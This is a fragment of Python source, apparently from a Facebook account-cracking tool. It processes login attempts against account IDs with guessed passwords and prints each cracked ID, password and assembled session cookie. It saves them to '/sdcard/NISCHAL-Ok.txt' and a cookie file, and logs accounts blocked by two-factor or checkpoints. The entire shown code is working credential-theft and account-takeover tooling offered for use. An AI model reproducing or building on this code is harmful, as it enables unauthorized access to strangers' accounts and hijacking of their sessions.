                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                      #  print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
                                        print('\r\r\033[1;32m [NISCHAL] '+ids+' | '+pas+'\033[1;97m')
                                        print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/NISCHAL-Ok.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NISCHAL-COOKiE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[NISCHAL-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [NISCHAL] '+ids+' | '+pas+'\033[1;97m')
